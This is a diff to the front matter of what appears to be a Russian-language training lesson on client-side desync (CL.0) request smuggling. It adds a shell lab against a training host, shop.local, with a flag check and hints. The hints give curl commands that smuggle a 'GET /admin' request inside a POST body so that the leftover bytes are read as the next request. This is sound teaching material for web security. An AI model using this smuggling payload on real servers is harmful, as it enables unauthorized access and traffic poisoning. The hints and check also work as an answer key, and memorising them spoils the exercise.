@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как превратить browser-driven запрос в десинхронизацию соединения и отравить чужой трафик без доступа к бэкенду."
+lab:
+  kind: shell
+  title: "Практика: CL.0 client-side desync"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Условие CSD — keep-alive и эндпоинт, который НЕ читает тело."
+    - "Проверь keep-alive: `curl -sI https://shop.local/ -H 'Connection: keep-alive'`."
+    - "Эндпоинт `/api/nothing` игнорирует тело POST — остаток станет следующим запросом."
+    - "`curl -s -X POST https://shop.local/api/nothing --data-binary 'GET /admin HTTP/1.1'` — в склеенном ответе флаг. Сохрани в `found.txt` и `check`."
 ---
 
 ## Вопрос, с которого всё начинается
